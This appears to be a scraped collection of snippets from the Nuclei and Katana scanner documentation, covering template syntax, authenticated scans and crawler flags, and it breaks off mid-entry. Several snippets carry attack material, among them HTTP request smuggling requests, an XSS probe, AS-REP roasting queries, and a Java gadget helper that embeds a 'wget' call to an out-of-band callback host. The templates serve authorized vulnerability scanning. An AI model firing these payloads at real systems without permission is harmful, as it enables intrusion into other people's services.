yaml\nCODE:\n```\nid: TE-CL-http-smuggling\n\ninfo:\n  name: HTTP request smuggling, basic TE.CL vulnerability\n  author: pdteam\n  severity: info\n  reference: https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl\n\nhttp:\n  - raw:\n    - |+\n      POST / HTTP/1.1\n      Host: {{Hostname}}\n      Content-Type: application/x-www-form-urlencoded\n      Content-length: 4\n      Transfer-Encoding: chunked\n      \n      5c\n      GPOST / HTTP/1.1\n      Content-Type: application/x-www-form-urlencoded\n      Content-Length: 15\n      \n      x=1\n      0\n    - |+\n      POST / HTTP/1.1\n      Host: {{Hostname}}\n      Content-Type: application/x-www-form-urlencoded\n      Content-length: 4\n      Transfer-Encoding: chunked\n      \n      5c\n      GPOST / HTTP/1.1\n      Content-Type: application/x-www-form-urlencoded\n      Content-Length: 15\n      \n      x=1\n      0\n      \n    unsafe: true\n    matchers:\n      - type: dsl\n        dsl:\n          - 'contains(body, \"Unrecognized method GPOST\")'\n```\n\n----------------------------------------\n\nTITLE: Complete DNS Template Example\nDESCRIPTION: A comprehensive example showing a complete DNS template that performs an A query and checks for CNAME and A records in the response.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/dns.mdx#2025-04-12_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\nid: dummy-cname-a\n\ninfo:\n  name: Dummy A dns request\n  author: mzack9999\n  severity: info\n  description: Checks if CNAME and A record is returned.\n\ndns:\n  - name: \"{{FQDN}}\"\n    type: A\n    class: inet\n    recursion: true\n    retries: 3\n    matchers:\n      - type: word\n        words:\n          # The response must contain a CNAME record\n          - \"IN\\tCNAME\"\n          # and also at least 1 A record\n          - \"IN\\tA\"\n        condition: and\n```\n\n----------------------------------------\n\nTITLE: Conditional Springboot Security Workflow\nDESCRIPTION: A conditional workflow that first detects Springboot and then runs multiple security checks and CVE tests if found.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/workflows/examples.mdx#2025-04-12_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nid: springboot-workflow\n\ninfo:\n  name: Springboot Security Checks\n  author: dwisiswant0\n\nworkflows:\n  - template: security-misconfiguration/springboot-detect.yaml\n    subtemplates:\n      - template: cves/CVE-2018-1271.yaml\n      - template: cves/CVE-2018-1271.yaml\n      - template: cves/CVE-2020-5410.yaml\n      - template: vulnerabilities/springboot-actuators-jolokia-xxe.yaml\n      - template: vulnerabilities/springboot-h2-db-rce.yaml\n```\n\n----------------------------------------\n\nTITLE: Running Nuclei Scans with Cloud Upload in Bash\nDESCRIPTION: Commands for running Nuclei scans on internal targets and uploading results to ProjectDiscovery Cloud Platform. Includes options for single target, multiple targets, and specific template scanning.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/cloud/scanning/internal-scan.mdx#2025-04-12_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\n# Single target\nnuclei -u http://internal-target -cloud-upload\n\n# Multiple targets\nnuclei -l internal-hosts.txt -cloud-upload\n\n# With specific templates\nnuclei -u http://internal-target -t misconfiguration/ -cloud-upload\n```\n\n----------------------------------------\n\nTITLE: Defining WordPress Login Template for Dynamic Authentication in YAML\nDESCRIPTION: This YAML template defines a WordPress login process using REST API. It includes HTTP request details, matchers for successful login, and extractors for session cookies. The template is designed to be used with dynamic authentication in Nuclei workflows.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/nuclei/authenticated-scans.mdx#2025-04-12_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nid: wordpress-login\n\ninfo:\n  name: WordPress Login\n  author: pdteam\n  severity: info\n  description: |\n    WordPress Login template to use in workflows for authenticated wordpress testing.\n  tags: wordpress,login\n\nhttp:\n  - raw:\n      - |\n        POST /wp-login.php HTTP/1.1\n        Host: {{Hostname}}\n        Origin: {{RootURL}}\n        Content-Type: application/x-www-form-urlencoded\n        Cookie: wordpress_test_cookie=WP%20Cookie%20check\n        \n        log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1\n    cookie-reuse: true\n    matchers-condition: and\n    matchers:\n      - type: status\n        status:\n          - 302\n\n      - type: word\n        part: header\n        words:\n          - '/wp-admin'\n          - 'wordpress_logged_in'\n        condition: and\n    \n    extractors:\n      - type: regex\n        name: wp-plugin-cookie\n        part: header\n        internal: true\n        regex:\n          - \"Set-Cookie: .+?; path=/wp-content/plugins; HttpOnly\"\n\n      - type: regex\n        name: wp-admin-cookie\n        part: header\n        internal: true\n        regex:\n          - \"Set-Cookie: .+?; path=/wp-admin; HttpOnly\"\n\n      - type: regex\n        name: wp-global-cookie\n        part: header\n        internal: true\n        regex: \n          - \"Set-Cookie: .+?; path=/; HttpOnly\"\n```\n\n----------------------------------------\n\nTITLE: Nuclei Template Helper Functions Example\nDESCRIPTION: Extensive YAML template demonstrating all available helper functions in Nuclei including base64 operations, version comparison, string manipulation, cryptographic functions, random generators, and more. The template shows practical usage of over 70 different helper functions with example inputs and expected outputs.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/reference/helper-functions-examples.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nid: helper-functions-examples\n\ninfo:\n  name: RAW Template with Helper Functions\n  author: pdteam\n  severity: info\n\nhttp:\n  - raw:\n      - |\n        GET / HTTP/1.1\n        Host: {{Hostname}}\n        1: {{base64(\"Hello\")}}\n        2: {{base64(1234)}}\n        3: {{base64_decode(\"SGVsbG8=\")}}\n        4: {{base64_py(\"Hello\")}}\n        5: {{compare_versions('v1.0.0', '>v0.0.1', '<v1.0.1')}}\n        6: {{concat(\"Hello\", \"world\")}}\n        7: {{contains(\"Hello\", \"lo\")}}\n        8: {{contains_all(\"Hello everyone\", \"lo\", \"every\")}}\n        9: {{contains_any(\"Hello everyone\", \"abc\", \"llo\")}}\n        10: {{date_time(\"%Y-%M-%D\")}}\n        11: {{date_time(\"%Y-%M-%D\", unix_time())}}\n        12: {{date_time(\"%H-%m\")}}\n        13: {{date_time(\"02-01-2006 15:04\")}}\n        14: {{date_time(\"02-01-2006 15:04\", unix_time())}}\n        15: {{dec_to_hex(11111)}}\n        16: {{generate_java_gadget(\"commons-collections3.1\", \"wget http://{{interactsh-url}}\", \"base64\")}}\n        17: {{gzip(\"Hello\")}}\n        18: {{gzip_decode(hex_decode(\"1f8b08000000000000fff248cdc9c907040000ffff8289d1f705000000\"))}}\n        19: {{hex_decode(\"6161\")}}\n        20: {{hex_encode(\"aa\")}}\n        21: {{hmac(\"sha1\", \"test\", \"scrt\")}} \n        22: {{hmac(\"sha256\", \"test\", \"scrt\")}}\n        23: {{html_escape(\"<body>test</body>\")}}\n        24: {{html_unescape(\"&lt;body&gt;test&lt;/body&gt;\")}}\n        25: {{join(\"_\", \"hello\", \"world\")}}\n        26: {{len(\"Hello\")}}\n        27: {{len(5555)}}\n        28: {{md5(\"Hello\")}}\n        29: {{md5(1234)}}\n        30: {{mmh3(\"Hello\")}}\n        31: {{print_debug(1+2, \"Hello\")}}\n        32: {{rand_base(5, \"abc\")}}\n        33: {{rand_base(5, \"\")}}\n        34: {{rand_base(5)}}\n        35: {{rand_char(\"abc\")}}\n        36: {{rand_char(\"\")}}\n        37: {{rand_char()}}\n        38: {{rand_int(1, 10)}}\n        39: {{rand_int(10)}}\n        40: {{rand_int()}}\n        41: {{rand_ip(\"192.168.0.0/24\")}}\n        42: {{rand_ip(\"2002:c0a8::/24\")}}\n        43: {{rand_ip(\"192.168.0.0/24\",\"10.0.100.0/24\")}}\n        44: {{rand_text_alpha(10, \"abc\")}}\n        45: {{rand_text_alpha(10, \"\")}}\n        46: {{rand_text_alpha(10)}}\n        47: {{rand_text_alphanumeric(10, \"ab12\")}}\n        48: {{rand_text_alphanumeric(10)}}\n        49: {{rand_text_numeric(10, 123)}}\n        50: {{rand_text_numeric(10)}}\n        51: {{regex(\"H([a-z]+)o\", \"Hello\")}}\n        52: {{remove_bad_chars(\"abcd\", \"bc\")}}\n        53: {{repeat(\"a\", 5)}}\n        54: {{replace(\"Hello\", \"He\", \"Ha\")}}\n        55: {{replace_regex(\"He123llo\", \"(\\\\d+)\", \"\")}}\n        56: {{reverse(\"abc\")}}\n        57: {{sha1(\"Hello\")}}\n        58: {{sha256(\"Hello\")}}\n        59: {{to_lower(\"HELLO\")}}\n        60: {{to_upper(\"hello\")}}\n        61: {{trim(\"aaaHelloddd\", \"ad\")}}\n        62: {{trim_left(\"aaaHelloddd\", \"ad\")}}\n        63: {{trim_prefix(\"aaHelloaa\", \"aa\")}}\n        64: {{trim_right(\"aaaHelloddd\", \"ad\")}}\n        65: {{trim_space(\"  Hello  \")}}\n        66: {{trim_suffix(\"aaHelloaa\", \"aa\")}}\n        67: {{unix_time(10)}}\n        68: {{url_decode(\"https:%2F%2Fprojectdiscovery.io%3Ftest=1\")}}\n        69: {{url_encode(\"https://projectdiscovery.io/test?a=1\")}}\n        70: {{wait_for(1)}}\n        71: {{zlib(\"Hello\")}}\n        72: {{zlib_decode(hex_decode(\"789cf248cdc9c907040000ffff058c01f5\"))}}\n        73: {{hex_encode(aes_gcm(\"AES256Key-32Characters1234567890\", \"exampleplaintext\"))}}\n        74: {{starts_with(\"Hello\", \"He\")}}\n        75: {{ends_with(\"Hello\", \"lo\")}}\n        76: {{line_starts_with(\"Hi\\nHello\", \"He\")}}\n        77: {{line_ends_with(\"Hello\\nHi\", \"lo\")}}\n        78: {{ip_format(\"169.254.169.254\", 4)}}\n```\n\n----------------------------------------\n\nTITLE: POST Request in HTTP Template\nDESCRIPTION: This template demonstrates how to perform a POST request with form data in Nuclei. It sends 'admin=test' as the body to the /admin endpoint and checks for a welcome message in the response.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/basic-http-examples.mdx#2025-04-12_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\nid: post-request\n\ninfo:\n  name: Test HTTP Template\n  author: pdteam\n  severity: info\n\nhttp:\n  - method: POST\n    path:\n      - \"{{BaseURL}}/admin\"\n\n    body: 'admin=test'\n\n    matchers:\n      - type: word\n        words:\n          - Welcome Admin\n```\n\n----------------------------------------\n\nTITLE: Executing JavaScript in Nuclei Headless Protocol\nDESCRIPTION: This snippet shows how to use the 'script' action to run JavaScript code on the current browser page. It includes an example of executing a simple alert.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/headless.mdx#2025-04-12_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\naction: script\nargs:\n  code: alert(document.domain)\n```\n\n----------------------------------------\n\nTITLE: Basic Raw HTTP GET Request Template in YAML\nDESCRIPTION: A basic Nuclei template that makes a GET request to the root path in raw HTTP format. It includes necessary headers like Host, Origin, User-Agent and checks for a specific string match in the response.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/raw-http-examples.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nid: basic-raw-example\ninfo:\n  name: Test RAW Template\n  author: pdteam\n  severity: info\n\nhttp:\n  - raw:\n      - |\n        GET / HTTP/1.1\n        Host: {{Hostname}}\n        Origin: {{BaseURL}}\n        Connection: close\n        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)\n        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\n        Accept-Language: en-US,en;q=0.9\n\n    matchers:\n      - type: word\n        words:\n          - \"Test is test matcher text\"\n```\n\n----------------------------------------\n\nTITLE: Basic SSH Public Key Detection Template\nDESCRIPTION: A Nuclei template that scans files with .pub extension for SSH public keys. Limits file reading to 1024 bytes and matches for 'ssh-rsa' pattern.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/file-examples.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nid: ssh-public-key\n\ninfo:\n  name: SSH Public Key Detect\n  author: pd-team\n  severity: low\n\nfile:\n  - extensions:\n      - pub\n    max-size: 1024 # read very small chunks\n\n    matchers:\n      - type: word\n        words:\n          - \"ssh-rsa\"\n```\n\n----------------------------------------\n\nTITLE: Orchestrating Vhost Enumeration using JavaScript in Nuclei\nDESCRIPTION: This JavaScript snippet demonstrates how to use flow to orchestrate vhost enumeration in Nuclei. It executes an SSL request, extracts domains from the certificate, and performs HTTP requests for each domain.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/flow.mdx#2025-04-12_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nssl();\nfor (let vhost of iterate(template[\"ssl_domains\"])) {\n    set(\"vhost\", vhost);\n    http();\n}\n```\n\n----------------------------------------\n\nTITLE: XSS Fuzzing Template Configuration\nDESCRIPTION: Complete example template for fuzzing XSS vulnerabilities with pre-conditions, payload definitions, and matchers for detecting reflections in responses.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/fuzzing-overview.mdx#2025-04-12_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nid: fuzz-reflection-xss\n\ninfo:\n  name: Basic Reflection Potential XSS Detection\n  author: pdteam\n  severity: low\n\nhttp:\n  - pre-condition:\n      - type: dsl\n        dsl:\n          - 'method == \"GET\"'       # only run if method is GET\n    payloads:\n      reflection:\n        - \"6842'\\\"><9967\"\n\n    stop-at-first-match: true\n    fuzzing:\n      - part: query\n        type: postfix\n        mode: single\n        fuzz:\n          - \"{{reflection}}\"\n\n    matchers-condition: and\n    matchers:\n      - type: word\n        part: body\n        words:\n          - \"{{reflection}}\"\n\n      - type: word\n        part: header\n        words:\n          - \"text/html\"\n```\n\n----------------------------------------\n\nTITLE: Reading File as String with Nuclei fs Module\nDESCRIPTION: Reads file contents from permitted paths and returns the content as a string using the ReadFileAsString function. Returns null if the operation fails.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/fs.mdx#2025-04-12_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\nconst fs = require('nuclei/fs');\n// here permitted directories are $HOME/nuclei-templates/*\nconst content = fs.ReadFileAsString('helpers/usernames.txt');\n```\n\n----------------------------------------\n\nTITLE: Katana CLI Help Menu\nDESCRIPTION: Complete list of command-line flags and options for the Katana web crawler tool, organized by categories including input, configuration, debug, headless mode, scope control, filtering, rate limiting, updates, and output options.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/katana/usage.mdx#2025-04-12_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nFlags:\nINPUT:\n   -u, -list string[]  target url / list to crawl\n\nCONFIGURATION:\n   -r, -resolvers string[]       list of custom resolver (file or comma separated)\n   -d, -depth int                maximum depth to crawl (default 3)\n   -jc, -js-crawl                enable endpoint parsing / crawling in javascript file\n   -jsl, -jsluice                 enable jsluice parsing in javascript file (memory intensive)\n   -ct, -crawl-duration value    maximum duration to crawl the target for (s, m, h, d) (default s)\n   -kf, -known-files string      enable crawling of known files (all,robotstxt,sitemapxml)\n   -mrs, -max-response-size int  maximum response size to read (default 9223372036854775807)\n   -timeout int                  time to wait for request in seconds (default 10)\n   -aff, -automatic-form-fill    enable automatic form filling (experimental)\n   -fx, -form-extraction         extract form, input, textarea & select elements in jsonl output\n   -retry int                    number of times to retry the request (default 1)\n   -proxy string                 http/socks5 proxy to use\n   -H, -headers string[]         custom header/cookie to include in all http request in header:value format (file)\n   -config string                path to the katana configuration file\n   -fc, -form-config string      path to custom form configuration file\n   -flc, -field-config string    path to custom field configuration file\n   -s, -strategy string          Visit strategy (depth-first, breadth-first) (default \"depth-first\")\n   -iqp, -ignore-query-params    Ignore crawling same path with different query-param values\n   -tlsi, -tls-impersonate       enable experimental client hello (ja3) tls randomization\n\nDEBUG:\n   -health-check, -hc        run diagnostic check up\n   -elog, -error-log string  file to write sent requests error log\n\nHEADLESS:\n   -hl, -headless                    enable headless hybrid crawling (experimental)\n   -sc, -system-chrome              use local installed chrome browser instead of katana installed\n   -sb, -show-browser                show the browser on the screen with headless mode\n   -ho, -headless-options string[]   start headless chrome with additional options\n   -nos, -no-sandbox                 start headless chrome in --no-sandbox mode\n   -cdd, -chrome-data-dir string     path to store chrome browser data\n   -scp, -system-chrome-path string  use specified chrome browser for headless crawling\n   -noi, -no-incognito              start headless chrome without incognito mode\n   -cwu, -chrome-ws-url string       use chrome browser instance launched elsewhere with the debugger listening at this URL\n   -xhr, -xhr-extraction             extract xhr request url,method in jsonl output\n\nSCOPE:\n   -cs, -crawl-scope string[]       in scope url regex to be followed by crawler\n   -cos, -crawl-out-scope string[]  out of scope url regex to be excluded by crawler\n   -fs, -field-scope string  pre-defined scope field (dn,rdn,fqdn) or custom regex (e.g., '(company-staging.io|company.com)') (default \"rdn\")\n   -ns, -no-scope                   disables host based default scope\n   -do, -display-out-scope          display external endpoint from scoped crawling\n\nFILTER:\n   -mr, -match-regex string[]       regex or list of regex to match on output url (cli, file)\n   -fr, -filter-regex string[]      regex or list of regex to filter on output url (cli, file)\n   -f, -field string                field to display in output (url,path,fqdn,rdn,rurl,qurl,qpath,file,ufile,key,value,kv,dir,udir)\n   -sf, -store-field string         field to store in per-host output (url,path,fqdn,rdn,rurl,qurl,qpath,file,ufile,key,value,kv,dir,udir)\n   -em, -extension-match string[]   match output for given extension (eg, -em php,html,js)\n   -ef, -extension-filter string[]  filter output for given extension (eg, -ef png,css)\n   -mdc, -match-condition string    match response with dsl based condition\n   -fdc, -filter-condition string   filter response with dsl based condition\n\nRATE-LIMIT:\n   -c, -concurrency int          number of concurrent fetchers to use (default 10)\n   -p, -parallelism int          number of concurrent inputs to process (default 10)\n   -rd, -delay int               request delay between each request in seconds\n   -rl, -rate-limit int          maximum requests to send per second (default 150)\n   -rlm, -rate-limit-minute int  maximum number of requests to send per minute\n\nUPDATE:\n   -up, -update                 update katana to latest version\n   -duc, -disable-update-check  disable automatic katana update check\n\nOUTPUT:\n   -o, -output string                file to write output to\n   -sr, -store-response              store http requests/responses\n   -srd, -store-response-dir string  store http requests/responses to custom directory\n   -or, -omit-raw                    omit raw requests/responses from jsonl output\n   -ob, -omit-body                   omit response body from jsonl output\n   -j, -jsonl                        write output in jsonl format\n   -nc, -no-color                    disable output content coloring (ANSI escape codes)\n   -silent                           display output only\n   -v, -verbose                      display verbose output\n   -debug                            display debug output\n   -version                          display project version\n```\n\n----------------------------------------\n\nTITLE: Nuclei Secret File Configuration Format\nDESCRIPTION: Complete YAML structure for configuring static and dynamic authentication in Nuclei's secret file, including examples of basic auth, API keys, bearer tokens, custom headers, and cookie-based authentication.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/nuclei/authenticated-scans.mdx#2025-04-12_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nstatic:\n  - type: basicauth\n    domains:\n      - scanme.sh\n    username: test\n    password: test\n\n  - type: query\n    domains:\n      - example.com\n    params:\n      - key: token\n        value: 1a2b3c4d5e6f7g8h9i0j\n\n  - type: bearertoken\n    domains-regex:\n      - .*scanme.sh\n      - .*pdtm.sh\n    token: test\n    \n  - type: header\n    domains:\n      - api.projectdiscovery.io\n      - cve.projectdiscovery.io\n      - chaos.projectdiscovery.io\n    headers:\n      - key: x-pdcp-key\n        value: <api-key-here>\n\n  - type: cookie\n    domains:\n      - scanme.sh\n    cookies:\n      - key: PHPSESSID\n        value: 1a2b3c4d5e6f7g8h9i0j\n\n\ndynamic:\n  - template: /path/to/wordpress-login.yaml\n    variables:\n      - key: username\n        value: pdteam\n      - key: password\n        value: nuclei-fuzz\n    input: auth-server.projectdiscovery.io\n    type: cookie\n    domains:\n        - .*wp.*projectdiscovery.io\n    cookies:\n      - raw: \"{{wp-global-cookie}}\"\n      - raw: \"{{wp-admin-cookie}}\"\n      - raw: \"{{wp-plugin-cookie}}\"\n```\n\n----------------------------------------\n\nTITLE: HTTP Request Smuggling Detection Template Using RawHTTP in Nuclei\nDESCRIPTION: This YAML template demonstrates how to detect HTTP request smuggling vulnerabilities using Nuclei with rawhttp enabled. It sends two requests: a malformed POST request with a smuggled GET request, followed by a normal GET request. The matcher checks if the response contains the injected script tag, indicating successful smuggling.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/unsafe-http.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nhttp:\n  - raw:\n    - |+\n        POST / HTTP/1.1\n        Host: {{Hostname}}\n        Content-Type: application/x-www-form-urlencoded\n        Content-Length: 150\n        Transfer-Encoding: chunked\n\n        0\n\n        GET /post?postId=5 HTTP/1.1\n        User-Agent: a\"/><script>alert(1)</script>\n        Content-Type: application/x-www-form-urlencoded\n        Content-Length: 5\n\n        x=1\n    - |+\n        GET /post?postId=5 HTTP/1.1\n        Host: {{Hostname}}\n\n    unsafe: true # Enables rawhttp client\n    matchers:\n      - type: dsl\n        dsl:\n          - 'contains(body, \"<script>alert(1)</script>\")'\n```\n\n----------------------------------------\n\nTITLE: Multiple Raw HTTP Requests Template in YAML\nDESCRIPTION: An advanced Nuclei template that makes sequential GET and POST requests in raw HTTP format. It demonstrates how to chain multiple requests in a single template and includes payload data for the POST request while checking for a specific string match.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/raw-http-examples.mdx#2025-04-12_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nid: multiple-raw-example\ninfo:\n  name: Test RAW Template\n  author: pdteam\n  severity: info\n\nhttp:\n  - raw:\n      - |\n        GET / HTTP/1.1\n        Host: {{Hostname}}\n        Origin: {{BaseURL}}\n        Connection: close\n        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)\n        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\n        Accept-Language: en-US,en;q=0.9\n\n      - |\n        POST /testing HTTP/1.1\n        Host: {{Hostname}}\n        Origin: {{BaseURL}}\n        Connection: close\n        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)\n        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\n        Accept-Language: en-US,en;q=0.9\n\n        testing=parameter\n\n    matchers:\n      - type: word\n        words:\n          - \"Test is test matcher text\"\n```\n\n----------------------------------------\n\nTITLE: Complete MongoDB Detection Network Template in Nuclei\nDESCRIPTION: A full example of a network template for detecting MongoDB, using hex-encoded input and matchers. This template demonstrates the combination of various concepts covered in the document.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/network.mdx#2025-04-12_snippet_11\n\nLANGUAGE: yaml\nCODE:\n```\nid: input-expressions-mongodb-detect\n\ninfo:\n  name: Input Expression MongoDB Detection\n  author: pdteam\n  severity: info\n  reference: https://github.com/orleven/Tentacle\n\ntcp:\n  - inputs:\n      - data: \"{{hex_decode('3a000000a741000000000000d40700000000000061646d696e2e24636d640000000000ffffffff130000001069736d6173746572000100000000')}}\"\n    host:\n      - \"{{Hostname}}\"\n    port: 27017\n    read-size: 2048\n    matchers:\n      - type: word\n        words:\n          - \"logicalSessionTimeout\"\n          - \"localTime\"\n```\n\n----------------------------------------\n\nTITLE: Multiple Matcher Conditions with AND\nDESCRIPTION: This template demonstrates the use of matcher-condition to combine different sets of matchers. It performs a GET request and requires both header conditions (with OR internally) and body conditions to be true for a match.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/basic-http-examples.mdx#2025-04-12_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nid: multiple-matchers-conditions\n\ninfo:\n  name: Test HTTP Template\n  author: pdteam\n  severity: info\n\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}\"\n\n    matchers-condition: and\n    matchers:\n\n      - type: word\n        words:\n          - \"X-Powered-By: PHP\"\n          - \"PHPSESSID\"\n        condition: or\n        part: header\n\n      - type: word\n        words:\n          - PHP\n        part: body\n```\n\n----------------------------------------\n\nTITLE: Complete Vhost Enumeration Template using Flow in Nuclei\nDESCRIPTION: This YAML template demonstrates a complete implementation of vhost enumeration using the flow protocol in Nuclei. It includes SSL certificate extraction, domain iteration, and HTTP request execution for each domain.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/flow.mdx#2025-04-12_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nid: vhost-enum-flow\n\ninfo:\n  name: vhost enum flow\n  author: tarunKoyalwar\n  severity: info\n  description: |\n    vhost enumeration by extracting potential vhost names from ssl certificate.\n\nflow: |\n  ssl();\n  for (let vhost of iterate(template[\"ssl_domains\"])) {\n    set(\"vhost\", vhost);\n    http();\n  }\n\nssl:\n  - address: \"{{Host}}:{{Port}}\"\n\nhttp:\n  - raw:\n      - |\n        GET / HTTP/1.1\n        Host: {{vhost}}\n\n    matchers:\n      - type: dsl\n        dsl:\n          - status_code != 400\n          - status_code != 502\n\n    extractors:\n      - type: dsl\n        dsl:\n          - '\"VHOST: \" + vhost + \", SC: \" + status_code + \", CL: \" + content_length'\n```\n\n----------------------------------------\n\nTITLE: Cloudlist Integration with Nuclei Scanner\nDESCRIPTION: Pipeline command showing how to combine Cloudlist with httpx and nuclei for security scanning of discovered assets\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/cloudlist/running.mdx#2025-04-12_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\ncloudlist -silent | httpx -silent | nuclei -t cves/\n```\n\n----------------------------------------\n\nTITLE: Getting Redis Server Info without Authentication\nDESCRIPTION: Retrieves server information from a Redis instance without authentication. Takes host and port as parameters and returns server info as string or null if failed.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/redis.mdx#2025-04-12_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\nconst redis = require('nuclei/redis');\nconst info = redis.GetServerInfo('acme.com', 6379);\n```\n\n----------------------------------------\n\nTITLE: TLS Network Request Template in YAML\nDESCRIPTION: Template for TLS-enabled network connection, similar to basic TCP but using TLS protocol prefix for secure communication.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/network-examples.mdx#2025-04-12_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nid: basic-tls-network-request\n\ninfo:\n  name: Basic TLS Network Request\n  author: pdteam\n  severity: info\n\ntcp:\n  - host: \n      - \"tls://{{Hostname}}\"\n    inputs:\n      - data: \"PING\\r\\n\"\n    read-size: 4\n    matchers:\n      - type: word\n        part: data\n        words:\n          - \"PONG\"\n```\n\n----------------------------------------\n\nTITLE: Managing Session Cookies in Nuclei\nDESCRIPTION: Controls cookie-based session management between multiple requests in a Nuclei template, allowing for authenticated scans or multi-step exploits.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/http/basic-http.mdx#2025-04-12_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\n# disable-cookie accepts boolean input and false as default\ndisable-cookie: true\n```\n\n----------------------------------------\n\nTITLE: Implementing DVWA Automated Login Using Headless Protocol in YAML\nDESCRIPTION: Template demonstrating automated login into DVWA using Headless protocol with step-by-step browser interactions including navigation, input filling, and button clicks. Uses XPath selectors for element targeting and includes matchers to verify successful login.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/headless.mdx#2025-04-12_snippet_7\n\nLANGUAGE: yaml\nCODE:\n```\nid: dvwa-headless-automatic-login\n\ninfo:\n  name: DVWA Headless Automatic Login\n  author: pdteam\n  severity: high\n\nheadless:\n  - steps:\n      - args:\n          url: \"{{BaseURL}}/login.php\"\n        action: navigate\n      - action: waitload\n      - args:\n          by: xpath\n          xpath: /html/body/div/div[2]/form/fieldset/input\n        action: click\n      - action: waitload\n      - args:\n          by: xpath\n          value: admin\n          xpath: /html/body/div/div[2]/form/fieldset/input\n        action: text\n      - args:\n          by: xpath\n          xpath: /html/body/div/div[2]/form/fieldset/input[2]\n        action: click\n      - action: waitload\n      - args:\n          by: xpath\n          value: password\n          xpath: /html/body/div/div[2]/form/fieldset/input[2]\n        action: text\n      - args:\n          by: xpath\n          xpath: /html/body/div/div[2]/form/fieldset/p/input\n        action: click\n      - action: waitload\n    matchers:\n      - part: resp\n        type: word\n        words:\n          - \"You have logged in as\"\n```\n\n----------------------------------------\n\nTITLE: Querying AsRepRoastable AD Users - JavaScript LDAP\nDESCRIPTION: Retrieves all Active Directory users that are AsRepRoastable using FilterIsPerson and FilterDontRequirePreauth filters. Returns a SearchResult object containing matching users.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/ldap.Client.mdx#2025-04-12_snippet_7\n\nLANGUAGE: javascript\nCODE:\n```\nconst ldap = require('nuclei/ldap');\nconst client = new ldap.Client('ldap://ldap.example.com', 'acme.com');\nconst AsRepRoastable = client.GetADUserAsRepRoastable();\nlog(to_json(AsRepRoastable));\n```\n\n----------------------------------------\n\nTITLE: Running SSH Command in JavaScript\nDESCRIPTION: Executes a command on the connected SSH server and returns the output as a string.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/ssh.SSHClient.mdx#2025-04-12_snippet_5\n\nLANGUAGE: javascript\nCODE:\n```\nconst ssh = require('nuclei/ssh');\nconst client = new ssh.SSHClient();\nclient.Connect('acme.com', 22, 'username', 'password');\nconst output = client.Run('id');\nlog(output);\n```\n\n----------------------------------------\n\nTITLE: DVWA XSS Reproduction with Nuclei Headless\nDESCRIPTION: This template automates the process of logging into DVWA (Damn Vulnerable Web App), navigating to the XSS testing page, and injecting an XSS payload. It hooks the alert function to detect if the XSS attack is successful.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/headless-examples.mdx#2025-04-12_snippet_2\n\nLANGUAGE: 